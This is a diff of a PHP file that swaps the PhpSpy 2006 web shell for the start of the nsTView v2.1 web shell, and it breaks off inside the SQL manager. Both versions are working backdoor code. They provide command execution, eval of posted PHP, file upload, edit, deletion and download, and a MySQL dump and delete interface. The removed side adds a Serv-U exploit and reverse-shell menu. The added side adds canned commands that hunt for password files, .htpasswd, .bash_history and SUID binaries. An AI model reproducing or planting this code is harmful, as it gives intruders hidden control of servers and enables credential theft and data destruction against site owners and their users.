@@ -1,1596 +1,2136 @@
-<?php
-/**
---------------------------------------------------------------------------------
-浅蓝的辐射鱼修改
-Http文件下载功能，用来下载网络上文件的。
-proc_open执行命令功能，用来在原本几个函数无法使用时执行CMD的(THX 我非我)。
-使用关键词查找文件功能。
-mysql fun语句提示。
-php代码压缩和加密功能(55KB的phpspy加密后22KB)。
-在目录后面加了一个改名目录的连接。
-环境变量里加了一个当前php进程用户的显示。
-eval在线执行php脚本。
---------------------------------------------------------------------------------
-七剑独孤修改
-加入SERV-U的EXP(这个EXP好像是我非我写的?)
-入口处加入alexa排名
-颜色上做了一些改动
-修正了两处BUG
----------------------------------------------------------------------------------
-原版本功能请见http://www.4ngel.net/project/phpspy.htm
-**/
-error_reporting(7);
-ob_start();
-$mtime = explode(' ', microtime());
-$starttime = $mtime[1] + $mtime[0];
-/*===================== 程序配置 =====================*/
-// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
-$admin['check'] = "0";
-// 如果需要密码验证,请修改登陆密码
-$admin['pass']  = "3204416";
-// 是否允许phpspy本身自动修改编辑后文件的时间为建立时间(yes/no)
-$retime = "no";
-// 默认cmd.exe的位置,proc_open函数要使用的,linux系统请对应修改.(假设是winnt系统在程序里依然可以指定)
-$cmd = "cmd.exe";
-// 下面是phpspy显示版权那栏的，因为被很多程序当成作为关键词杀了，鱼寒~~允许自定义吧。还是不懂别改~~
-$notice = "[<a href=\"http://www.51shell.cn\" title=\"浅蓝的辐射鱼\">Saiy</a>]  [<a href=\"http://www.4gnel.net\" title=\"安全天使\">S4T</a>]  [<a href=\"http://1v1.name\" title=\"7jdg\">7jdg</a>]<br><FONT color=#ff3300>声明:请勿使用本程序从事非法行为，否则后果自负！</font>";
-/*===================== 配置结束 =====================*/
-// 允许程序在 register_globals = off 的环境下工作
-$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');
+<?
+@session_start();
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+error_reporting(E_ALL & ~E_NOTICE);
+#####cfg#####
+# use password  true / false #
+$create_password = true;
+$password = "3204416";    // default password for nstview, you can change it.
 
-if ($onoff != 1) {
-	@extract($_POST, EXTR_SKIP);
-	@extract($_GET, EXTR_SKIP);
+# UNIX COMMANDS
+# description (nst) command
+# example: Shutdown (nst) shutdown -h now
+$fast_commands = "
+Show open ports (nst) netstat -an | grep LISTEN | grep tcp
+last root (nst) last root
+last (all users) (nst) last all
+Find all config.php in / (nst) find / -type f -name config.php
+Find all config.php in . (nst) find . -type f -name config.php
+Find all admin.php in / (nst) find / -type f -name admin.php
+Find all admin.php in . (nst) find . -type f -name admin.php
+Find all config.inc.php in / (nst) find / -type f -name config.inc.php
+Find all config.inc.php in . (nst) find . -type f -name config.inc.php
+Find all config.inc in / (nst) find / -type f -name config.inc
+Find all config.inc in . (nst) find . -type f -name config.inc
+Find all config.dat in / (nst) find / -type f -name config.dat
+Find all config.dat in . (nst) find . -type f -name config.dat
+Find all config* in / (nst) find / -type f -name config*
+Find all config* in . (nst) find . -type f -name config*
+Find all pass* in / (nst) find / -type f -name pass*
+Find all pass* in . (nst) find . -type f -name pass*
+Find all .bash_history in / (nst) find / -type f -name .bash_history
+Find all .bash_history in . (nst) find . -type f -name .bash_history
+Find all .htpasswd  in / (nst) find / -type f -name .htpasswd
+Find all .htpasswd  in . (nst) find . -type f -name .htpasswd
+Find all writable dirs/files in / (nst) find / -perm -2 -ls
+Find all writable dirs/files in . (nst) find . -perm -2 -ls
+Find all suid files in / (nst) find / -type f -perm -04000 -ls
+Find all suid files in . (nst) find . -type f -perm -04000 -ls
+Find all sgid files in / (nst) find / -type f -perm -02000 -ls
+Find all sgid files in . (nst) find . -type f -perm -02000 -ls
+Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc
+Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc
+OS Version? (nst) sysctl -a | grep version
+Kernel version? (nst) cat /proc/version
+cat syslog.conf (nst) cat /etc/syslog.conf
+Cat - Message of the day (nst) cat /etc/motd
+Cat hosts (nst) cat /etc/hosts
+Distrib name (nst) cat /etc/issue.net
+Distrib name (2) (nst) cat /etc/*-realise
+Display all process - wide output (nst) ps auxw
+Display all your process (nst) ps ux
+Interfaces (nst) ifconfig
+CPU? (nst) cat /proc/cpuinfo
+RAM (nst) free -m
+HDD space (nst) df -h
+List of Attributes (nst) lsattr -a
+Mount options (nst) cat /etc/fstab
+Is cURL installed? (nst) which curl
+Is wGET installed? (nst) which wget
+Is lynx installed? (nst) which lynx
+Is links installed? (nst) which links
+Is fetch installed? (nst) which fetch
+Is GET installed? (nst) which GET
+Is perl installed? (nst) which perl
+Where is apache (nst) whereis apache
+Where is perl (nst) whereis perl
+locate proftpd.conf (nst) locate proftpd.conf
+locate httpd.conf (nst) locate httpd.conf
+locate my.conf (nst) locate my.conf
+locate psybnc.conf (nst) locate psybnc.conf
+";
+
+
+
+# WINDOWS COMMANDS
+# description (nst) command
+# example: Delete autoexec.bat (nst) del c:\autoexec.bat
+$fast_commands_win = "
+OS Version (nst) ver
+Tasklist  (nst) tasklist
+Attributes in . (nst) attrib
+Show open ports (nst) netstat -an
+";
+
+
+
+
+
+######ver####
+$ver= "v2.1";
+#############
+$pass=$_POST['pass'];
+if($pass==$password){
+$_SESSION['nst']="$pass";
+}
+if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
+else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
+else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
+else $ip = $_SERVER['REMOTE_ADDR'];
+$ip=htmlspecialchars($ip);
+
+if($create_password==true){
+
+if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
+die("
+<title>nsTView $ver:: nst.void.ru</title>
+<center>
+<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>
+<font size=1 face=verdana><center>
+<b>nsTView $ver :: <a href=http://nst.void.ru style='text-decoration:none;'><font color=black>nst.void.ru</font></a><br></b>
+</center>
+<form method=post>
+Password:<br>
+<input type=password name=pass size=30 tabindex=1>
+</form>
+<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
+<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>
+<b>Your ip:</b> ".$ip."
+</td></tr></table>
+");}
+
+}
+$d=$_GET['d'];
+
+function adds($editf){
+#if(get_magic_quotes_gpc()==0){
+$editf=addslashes($editf);
+#}
+return $editf;
+}
+function adds2($editf){
+if(get_magic_quotes_gpc()==0){
+$editf=addslashes($editf);
+}
+return $editf;
 }
 
-$self = $_SERVER['PHP_SELF'];
-$dis_func = get_cfg_var("disable_functions");
+$f   = "nst_sql.txt";
+$f_d = $_GET['f_d'];
 
+if($_GET['download']){
+$download=$_GET['download'];
+header("Content-disposition: attachment; filename=\"$download\";");
+readfile("$d/$download");
+exit;}
 
-/*===================== 身份验证 =====================*/
-if($admin['check'] == "1") {
-	if ($_GET['action'] == "logout") {
-		setcookie ("adminpass", "");
-		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
-		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 &gt;&gt;&gt;</a></span>";
-		exit;
-	}
-
-	if ($_POST['do'] == 'login') {
-		$thepass=trim($_POST['adminpass']);
-		if ($admin['pass'] == $thepass) {
-			setcookie ("adminpass",$thepass,time()+(1*24*3600));
-			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
-			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 &gt;&gt;&gt;</a></span>";
-			exit;
-		}
-	}
-	if (isset($_COOKIE['adminpass'])) {
-		if ($_COOKIE['adminpass'] != $admin['pass']) {
-			loginpage();
-		}
-	} else {
-		loginpage();
-	}
+if($_GET['dump_download']){
+header("Content-disposition: attachment; filename=\"$f\";");
+header("Content-length: ".filesize($f_d."/".$f));
+header("Expires: 0");
+readfile($f_d."/".$f);
+if(is_writable($f_d."/".$f)){
+unlink($f_d."/".$f);
 }
-/*===================== 验证结束 =====================*/
-
-// 判断 magic_quotes_gpc 状态
-if (get_magic_quotes_gpc()) {
-    $_GET = stripslashes_array($_GET);
-	$_POST = stripslashes_array($_POST);
+die;
 }
 
-// 查看PHPINFO
-if ($_GET['action'] == "phpinfo") {
-	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
-	exit;
+
+$images=array(".gif",".jpg",".png",".bmp",".jpeg");
+$whereme=getcwd();
+@$d=@$_GET['d'];
+$copyr = "<center><a href=http://nst.void.ru target=_blank>nsTView $ver<br>o... Network security team ...o</a>";
+$php_self=@$_SERVER['PHP_SELF'];
+if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
+if(!isset($d)){$d=$whereme;}
+$d=str_replace("\\","/",$d);
+if(@$_GET['p']=="info"){
+@phpinfo();
+exit;}
+if(@$_GET['img']=="1"){
+@$e=$_GET['e'];
+header("Content-type: image/gif");
+readfile("$d/$e");
 }
-if($_GET['action'] == "nowuser") {
-$user = get_current_user();
-if(!$user) $user = "报告长官，主机变态，无法获取当前进行用户名！";
-echo"当前进程用户名：$user";
+if(@$_GET['getdb']=="1"){
+header('Content-type: application/plain-text');
+header('Content-Disposition: attachment; filename=nst-mysql-damp.htm');
+}
+print "<title>nsT View $ver</title>
+<style>
+BODY, TD, TR {
+text-decoration: none;
+font-family: Verdana;
+font-size: 8pt;
+SCROLLBAR-FACE-COLOR: #363d4e;
+SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;
+SCROLLBAR-SHADOW-COLOR: #363d4e;
+SCROLLBAR-ARROW-COLOR: #363d4e;
+SCROLLBAR-TRACK-COLOR: #91AAFF
+}
+input, textarea, select {
+font-family: Verdana;
+font-size: 10px;
+color: black;
+background-color: white;
+border: solid 1px;
+border-color: black
+}
+UNKNOWN {
+COLOR: #0006DE;
+TEXT-DECORATION: none
+}
+A:link {
+COLOR: #0006DE;
+TEXT-DECORATION: none
+}
+A:hover {
+COLOR: #FF0C0B;
+TEXT-DECORATION: none
+}
+A:active {
+COLOR: #0006DE;
+TEXT-DECORATION: none
+}
+A:visited {
+TEXT-DECORATION: none
+}
+</style>
+<script>
+function ShowOrHide(d1, d2) {
+if (d1 != '') DoDiv(d1);
+if (d2 != '') DoDiv(d2);}
+
+function DoDiv(id) {
+var item = null;
+if (document.getElementById) {
+item = document.getElementById(id);
+} else if (document.all){
+item = document.all[id];
+} else if (document.layers){
+item = document.layers[id];}
+if (!item) {}
+else if (item.style) {
+if (item.style.display == \"none\"){ item.style.display = \"\"; }
+else {item.style.display = \"none\"; }
+}else{ item.visibility = \"show\"; }}
+
+function cwd(text){
+document.sh311Form.sh3.value+=\" \"+ text;
+document.sh311Form.sh3.focus();
+}
+
+
+</script>
+";
+print "<body vlink=#0006DE>
+<table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center>
+<tr><td><font face=wingdings size=2>0</font>";
+$expl=explode("/",$d);
+$coun=count($expl);
+if($os=="unix"){echo "<a href='$php_self?d=/'>/</a>";}
+else{
+        echo "<a href='$php_self?d=$expl[0]'>$expl[0]/</a>";}
+for($i=1; $i<$coun; $i++){
+        @$xx.=$expl[$i]."/";
+$sls="<a href='$php_self?d=$expl[0]/$xx'>$expl[$i]</a>/";
+$sls=str_replace("//","/",$sls);
+$sls=str_replace("/'></a>/","/'></a>",$sls);
+print $sls;
+}
+if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}
+if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}
+echo "</td></tr>";
+if($os=="unix"){ echo "
+<tr><td><b>id:</b> ".@exec('id')."</td></tr>
+<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";} echo"
+<tr><td><b>Your IP: [<font color=#5F3CC1>$ip</font>] Server IP: [<font color=#5F3CC1>".gethostbyname($_SERVER["HTTP_HOST"])."</font>] Server <a href=# title='Host.Domain'>H.D.</a>: [<font color=#5F3CC1>".$_SERVER["HTTP_HOST"]."</font>]</b><br>
+[<b>Safe mode:</b> $safe_m] [<b>Register globals:</b> $reg_g]<br>
+[<a href=# onClick=location.href=\"javascript:history.back(-1)\">Back</a>]
+[<a href='$php_self'>Home</a>]
+[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]
+[<a href='$php_self?d=$d&t=upload'>Upload</a>]
+[<a href='$php_self?t=tools'>Tools</a>]
+[<a href='$php_self?p=info'>PHPinfo</a>]
+[<a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'>DEL Folder</a>]
+[<a href='$php_self?p=sql'>SQL</a>]
+[<a href='$php_self?p=selfremover'>Self Remover</a>]
+</td></tr>
+";
+if($os=="win"){ echo "
+<tr><td bgcolor=white>
+<center><font face=wingdings size=2><</font>
+<a href='$php_self?d=a:/'>A</a>
+<a href='$php_self?d=b:/'>B</a>
+<a href='$php_self?d=c:/'>C</a>
+<a href='$php_self?d=d:/'>D</a>
+<a href='$php_self?d=e:/'>E</a>
+<a href='$php_self?d=f:/'>F</a>
+<a href='$php_self?d=g:/'>G</a>
+<a href='$php_self?d=h:/'>H</a>
+<a href='$php_self?d=i:/'>I</a>
+<a href='$php_self?d=j:/'>J</a>
+<a href='$php_self?d=k:/'>K</a>
+<a href='$php_self?d=l:/'>L</a>
+<a href='$php_self?d=m:/'>M</a>
+<a href='$php_self?d=n:/'>N</a>
+<a href='$php_self?d=o:/'>O</a>
+<a href='$php_self?d=p:/'>P</a>
+<a href='$php_self?d=q:/'>Q</a>
+<a href='$php_self?d=r:/'>R</a>
+<a href='$php_self?d=s:/'>S</a>
+<a href='$php_self?d=t:/'>T</a>
+<a href='$php_self?d=u:/'>U</a>
+<a href='$php_self?d=v:/'>V</a>
+<a href='$php_self?d=w:/'>W</a>
+<a href='$php_self?d=x:/'>X</a>
+<a href='$php_self?d=y:/'>Y</a>
+<a href='$php_self?d=z:/'>Z</a>
+</td></tr>";}else{echo "<tr><td>&nbsp;</td></tr>";}
+print "<tr><td>
+:: <a href='$php_self?d=$d&mkdir=1'>Create folder</a> ::
+<a href='$php_self?d=$d&mkfile=1'>Create file</a> ::
+<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file if safe mode is On</a> ::";
+if($os=="unix"){
+print "<a href='$php_self?d=$d&ps_table=1'>PS table</a> ::";
+}
+print "</td></tr>";
+
+
+
+
+
+if($_GET['p']=="ftp"){
+print "<tr><td>";
+
+
+
+print "</td></tr></table>";
+print $copyr;
 exit;
 }
-if(isset($_POST['phpcode'])){
-	eval("?".">$_POST[phpcode]<?");
-	exit;
-}
-// 在线代理
-if (isset($_POST['url'])) {
-	$proxycontents = @file_get_contents($_POST['url']);
-	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
-	exit;
-}
 
-// 下载文件
-if (!empty($downfile)) {
-	if (!@file_exists($downfile)) {
-		echo "<script>alert('你要下的文件不存在!')</script>";
-	} else {
-		$filename = basename($downfile);
-		$filename_info = explode('.', $filename);
-		$fileext = $filename_info[count($filename_info)-1];
-		header('Content-type: application/x-'.$fileext);
-		header('Content-Disposition: attachment; filename='.$filename);
-		header('Content-Description: PHP Generated Data');
-		header('Content-Length: '.filesize($downfile));
-		@readfile($downfile);
-		exit;
-	}
-}
 
-// 直接下载备份数据库
-if ($_POST['backuptype'] == 'download') {
-	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
-	@mysql_select_db($dbname) or die("选择数据库失败");	
-	$table = array_flip($_POST['table']);
-	$result = mysql_query("SHOW tables");
-	echo ($result) ? NULL : "出错: ".mysql_error();
 
-	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
-	header('Content-type: application/unknown');
-	header('Content-Disposition: attachment; filename='.$filename);
-	$mysqldata = '';
-	while ($currow = mysql_fetch_array($result)) {
-		if (isset($table[$currow[0]])) {
-			$mysqldata.= sqldumptable($currow[0]);
-			$mysqldata.= $mysqldata."\r\n";
-		}
-	}
-	mysql_close();
-	exit;
-}
 
-// 程序目录
-$pathname=str_replace('\\','/',dirname(__FILE__)); 
 
-// 获取当前路径
-if (!isset($dir) or empty($dir)) {
-	$dir = ".";
-	$nowpath = getPath($pathname, $dir);
-} else {
-	$dir=$_GET['dir'];
-	$nowpath = getPath($pathname, $dir);
-}
 
-// 判断读写情况
-$dir_writeable = (dir_writeable($nowpath)) ? "可写" : "不可写";
-$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
-$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">注册表操作</a>" : "";
 
-$tb = new FORMS;
+
+
+
+if(@$_GET['p']=="sql"){
+print "<tr><td>";
+###
+
+$f_d = $_GET['f_d'];
+if(!isset($f_d)){$f_d=".";}
+if($f_d==""){$f_d=".";}
+
+$php_self=$_SERVER['PHP_SELF'];
+$delete_table=$_GET['delete_table'];
+$tbl=$_GET['tbl'];
+$from=$_GET['from'];
+$to=$_GET['to'];
+$adress=$_POST['adress'];
+$port=$_POST['port'];
+$login=$_POST['login'];
+$pass=$_POST['pass'];
+$adress=$_GET['adress'];
+$port=$_GET['port'];
+$login=$_GET['login'];
+$pass=$_GET['pass'];
+$conn=$_GET['conn'];
+if(!isset($adress)){$adress="localhost";}
+if(!isset($login)){$login="root";}
+if(!isset($pass)){$pass="";}
+if(!isset($port)){$port="3306";}
+if(!isset($from)){$from=0;}
+if(!isset($to)){$to=50;}
+
 
 ?>
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
-<title>http://<? echo $_SERVER['HTTP_HOST'];?>  PhpSpy 2006 修改版</title>
-<style type="text/css">
-body{
-	BACKGROUND-COLOR: #F5F5F5; 
-	COLOR: #3F3849; 
-	font-family: "Verdana", "Tahoma", "宋体";
-	font-size: "12px";
-	line-height: "140%";
-}
+<style>
+table,td{
+color: black;
+font-face: verdana;
+font-size: 11px;
 
-TD		{FONT-FAMILY: "Verdana", "Tahoma", "宋体"; FONT-SIZE: 12px; line-height: 140%;}
-.smlfont {
-	font-family: "Verdana", "Tahoma", "宋体";
-	font-size: "11px";
 }
-.INPUT {
-	FONT-SIZE: "12px";
-	COLOR: "#000000";
-	BACKGROUND-COLOR: "#FFFFFF";
-	height: "18px";
-	border: "1px solid #666666";
-	padding-left: "2px";
-}
-.redfont {
-	COLOR: "#CA0000";
-}
-A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}
-A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}
-A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
-A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
-.top {BACKGROUND-COLOR: "#CCCCCC"}
-.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
-.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
 </style>
-<SCRIPT language=JavaScript>
-function CheckAll(form) {
-	for (var i=0;i<form.elements.length;i++) {
-		var e = form.elements[i];
-		if (e.name != 'chkall')
-		e.checked = form.chkall.checked;
-    }
-}
-function really(d,f,m,t) {
-	if (confirm(m)) {
-		if (t == 1) {
-			window.location.href='?dir='+d+'&deldir='+f;
-		} else {
-			window.location.href='?dir='+d+'&delfile='+f;
-		}
-	}
-}
-</SCRIPT>
-</head>
-<body style="table-layout:fixed; word-break:break-all">
-<center>
-<?php
-$test = "";
-if(!$_GET['dir']) $dir = "./";
-$tb->tableheader();
-$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
-$tb->tdbody('| <a href="?action=logout">注销登录</a> | <a href="?action=dir">Shell 目录</a> | <a href="?action=phpenv">环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | ');
-$tb->tdbody('| <a href="?action=downloads">Http 文件下载</a> | <a href="?action=search&dir='.$dir.'">文件查找</a> | <a href="?action=eval">执行php脚本</a> | <a href="?action=sql">执行SQL语句</a> | <a href="?action=sql&type=fun">Func反弹Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> |');
-$tb->tablefooter();
-?>
-<hr width="775" noshade>
-<table width="775" border="0" cellpadding="0">
-<?
-$tb->headerform(array('method'=>'GET','content'=>'<p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));
+<font color=black face=verdana size=1>
+<? if(!$conn){ ?>
 
-$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'上传文件到当前目录: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','确定','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));
-
-$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'新建文件在当前目录: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','确定','','submit')));
-
-$tb->headerform(array('content'=>'新建目录在当前目录: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','确定','','submit')));
-?>
+<!-- table 1 -->
+<table bgcolor=#D7FFA8>
+<tr><td valign=top>Address:</td><td><form><input name=adress value='<?=$adress?>' size=20><input name=port value='<?=$port?>' size=6></td></tr>
+<tr><Td valign=top>Login: </td><td><input name=login value='<?=$login?>' size=10></td></tr>
+<tr><Td valign=top>Pass:</td><td> <input name=pass value='<?=$pass?>' size=10><input type=hidden name=p value=sql></td></tr>
+<tr><td></td><td><input type=submit name=conn value=Connect></form></td></tr><?}?>
+<tr><td valign=top><? if($conn){ echo "<b>PHP v".@phpversion()."<br>mySQL v".@mysql_get_server_info()."<br>";}?></b></td><td></td></tr>
 </table>
-<hr width="775" noshade>
-<?php
-/*===================== 执行操作 开始 =====================*/
-echo "<p><b>\n";
-// 删除文件
-if (!empty($delfile)) {
-	if (file_exists($delfile)) {
-		echo (@unlink($delfile)) ? $delfile." 删除成功!" : "文件删除失败!";
-	} else {
-		echo basename($delfile)." 文件已不存在!";
-	}
-}
+<!-- end of table 1 -->
 
-// 删除目录
-elseif (!empty($deldir)) {
-	$deldirs="$dir/$deldir";
-	if (!file_exists("$deldirs")) {
-		echo "$deldir 目录已不存在!";
-	} else {
-		echo (deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!";
-	}
-}
 
-// 创建目录
-elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
-	if (!empty($newdirectory)) {
-		$mkdirs="$dir/$newdirectory";
-		if (file_exists("$mkdirs")) {
-			echo "该目录已存在!";
-		} else {
-			echo (@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!";
-			@chmod("$mkdirs",0777);
-		}
-	}
-}
+<?
+$conn=$_GET['conn'];
+$adress=$_GET['adress'];
+$port=$_GET['port'];
+$login=$_GET['login'];
+$pass=$_GET['pass'];
+if($conn){
 
-// 上传文件
-elseif ($doupfile) {
-	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "上传成功!" : "上传失败!";
+$serv = @mysql_connect($adress.":".$port, $login,$pass) or die("<font color=red>Error: ".mysql_error()."</font>");
+if($serv){$status="Connected. :: <a href='$php_self?p=sql'>Log out</a>";}else{$status="Disconnected.";}
+print "<b><font color=green>Status: $status<br><br>"; # #D7FFA8
+print "<table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8><tr><td valign=top>";
+print "<br><font color=red>[db]</font><Br>";
+print "<font color=white>";
+$res = mysql_list_dbs($serv);
+while ($str=mysql_fetch_row($res)){
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'>[DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a></b><br>";
+$tc++;
 }
+$baza=$_GET['baza'];
+$db=$_GET['db'];
+print "<font color=red>[Total db: $tc]</font><br>";
+if($baza){
+print "<div align=left><font color=green>db: [$db]</div></font><br>";
+$result=@mysql_list_tables($db);
+while($str=@mysql_fetch_array($result)){
+$c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
+$records=mysql_fetch_array($c);
 
-// 编辑文件
-elseif ($_POST['do'] == 'doeditfile') {
-	if (!empty($_POST['editfilename'])) {
-    if(!file_exists($editfilename)) unset($retime);
-	if($time==$now) $time = @filemtime($editfilename);
-        $time2 = @date("Y-m-d H:i:s",$time);
-		$filename="$editfilename";
-		@$fp=fopen("$filename","w");
-		if($_POST['change']=="yes"){
-		$filecontent = "?".">".$_POST['filecontent']."<?";
-		$filecontent = gzdeflate($filecontent);
-        $filecontent = base64_encode($filecontent);
-        $filecontent = "<?php\n/*\n代码由浅蓝的辐射鱼加密!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?>";
-		}else{
-		$filecontent = $_POST['filecontent'];
-		}
-		echo $msg=@fwrite($fp,$filecontent) ? "写入文件成功!" : "写入失败!";
-		@fclose($fp);
-		if($retime=="yes"){
-        echo"&nbsp;鱼鱼自动操作:";
-        echo $msg=@touch($filename,$time) ? "修改文件为".$time2."成功!" : "修改文件时间失败!";
-		}
-	} else {
-		echo "请输入想要编辑的文件名!";
-	}
-}
-//文件下载
-elseif ($_POST['do'] == 'downloads') {
-	$contents = @file_get_contents($_POST['durl']);
-	if(!$contents){
-	echo"无法读取要下载的数据";
-	}
-	elseif(file_exists($path)){
-	echo"很抱歉，文件".$path."已经存在了，请更换保存文件名。";
-	}else{
-    $fp = @fopen($path,"w");
-	echo $msg=@fwrite($fp,$contents) ? "下载文件成功!" : "下载文件写入时失败!";
-	@fclose($fp);
-	}
-}
-
-// 编辑文件属性
-elseif ($_POST['do'] == 'editfileperm') {
-	if (!empty($_POST['fileperm'])) {
-		$fileperm=base_convert($_POST['fileperm'],8,10);
-		echo (@chmod($dir."/".$file,$fileperm)) ? "属性修改成功!" : "修改失败!";
-		echo " 文件 ".$file." 修改后的属性为: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
-	} else {
-		echo "请输入想要设置的属性!";
-	}
-}
-
-// 文件改名
-elseif ($_POST['do'] == 'rename') {
-	if (!empty($_POST['newname'])) {
-		$newname=$_POST['dir']."/".$_POST['newname'];
-		if (@file_exists($newname)) {
-			echo "".$_POST['newname']." 已经存在,请重新输入一个!";
-		} else {
-			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." 成功改名为 ".$_POST['newname']." !" : "文件名修改失败!";
-		}
-	} else {
-		echo "请输入想要改的文件名!";
-	}
-}
-elseif ($_POST['do'] == 'search') {
-if(!empty($oldkey)){
-echo"<span class=\"redfont\">查找关键词:[".$oldkey."],下面显示查找的结果:";
-	if($type2 == "getpath"){
-	echo"鼠标移到结果文件上会有部分截取显示.";
-}
-echo"</span><br><hr width=\"775\" noshade>";
-find($path);
+if(strlen($str[0])>$s4ot){$s4ot=strlen($str[0]);}
+if($records[0]=="0"){
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>";
 }else{
-echo"你要查虾米?到底要查虾米呢?有没有虾米要你查呢?";
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>";
+}
+mysql_free_result($c);
+$total_t++;
+}
+print "<br><B><font color=red>Total tables: $total_t</font></b>";
+                                print "<pre>";
+for($i=0; $i<$s4ot+10; $i++){print "&nbsp;";}
+                                print "</pre>";
+} #end baza
+
+
+
+
+# delete table
+if(isset($delete_table)){
+mysql_select_db($_GET['db']) or die("<font color=red>".mysql_error()."</font>");
